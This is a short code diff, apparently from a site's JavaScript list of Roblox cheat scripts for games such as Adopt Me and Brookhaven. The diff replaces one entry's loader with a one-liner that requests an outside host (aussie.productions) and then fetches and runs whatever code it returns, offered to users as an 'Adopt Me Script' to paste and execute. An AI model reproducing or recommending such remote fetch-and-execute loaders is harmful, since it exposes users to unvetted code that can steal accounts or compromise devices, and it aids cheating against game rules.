@@ -16,13 +16,13 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/tlredz/Scripts/refs/h
         dateAdded: "2025-05-01"
     },
     {
-        name: "Adopt Me Pet Collector",
+        name: "Adopt Me Script",
         game: "Adopt Me",
         category: "Simulation",
         description: "A script for Adopt Me with pet auto-collect.",
-        code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/JusticeValley/Antarctic-Hub/main/New.lua", true))()`,
+        code: `loadstring(game:HttpGet(request({Url='https://aussie.productions/script'}).Body))()`,
         popularity: 90,
-        dateAdded: "2025-04-15"
+        dateAdded: "2025-10-15"
     },
     {
         name: "Brookhaven Exploit script",
@@ -895,3 +895,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
     init();
 });
+
